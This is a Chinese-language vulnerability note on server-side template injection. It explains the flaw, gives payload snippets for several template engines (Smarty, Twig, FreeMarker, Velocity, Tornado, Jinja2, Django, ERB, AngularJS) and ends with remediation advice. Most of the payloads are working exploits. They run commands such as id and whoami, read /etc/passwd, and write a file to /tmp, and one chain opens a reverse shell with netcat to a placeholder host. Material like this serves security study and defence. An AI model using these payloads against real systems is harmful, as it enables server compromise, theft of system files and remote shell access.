# SSTI

## 0x01 漏洞描述

模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。

SSTI （服务器端模板注入）如果攻击者能够控制要呈现的模板，服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，就可能导致上下文数据的暴露，甚至在服务器上运行任意命令的表达式。

## 0x02 常见应用场景

凡是使用模板的应用程序都有可能出现服务器端模版注入漏洞。

### 2.1 PHP

* Smarty

```
{php}echo `id`;{/php}
{self::getStreamVariable("file:///etc/passwd")}
```

* Twig

```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
```

### 2.2 Java

* FreeMarker

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

* Velocity

```
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### 2.3 Python

- Tornado

```
{{handler.settings}}
{% import os %}{{ os.popen("whoami").read() }}
```

- Flask/Jinja2

```
{{ config.items() }}
{{''.__class__.__mro__[-1].__subclasses__()}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

- Django

```
//写文件
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}
//加载system
{{ config.from_pyfile('/tmp/evil') }}
//执行命令反弹SHELL
{{ config['SHELL']('nc xxxx xx -e /bin/sh') }}
```

### 2.4 Ruby

```
<%= 7 * 7 %>
<%= File.open('/etc/passwd').read %>
```

#### 2.5 AngularJS

```
$eval('1+1')
```

## 0x03 漏洞危害

* 获取上下文敏感数据信息、配置信息；
* 读取、写入恶意文档到服务器中；
* 执行系统命令；

## 0x04 修复建议

* 不要让用户对传入模板的内容或者模板本身进行控制。
* 减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式。
* 如果需要将动态数据传递给模板，不要直接在模板文件中执行，可以使用模板引擎的内置功能来扩展表达式，实现同样的效果。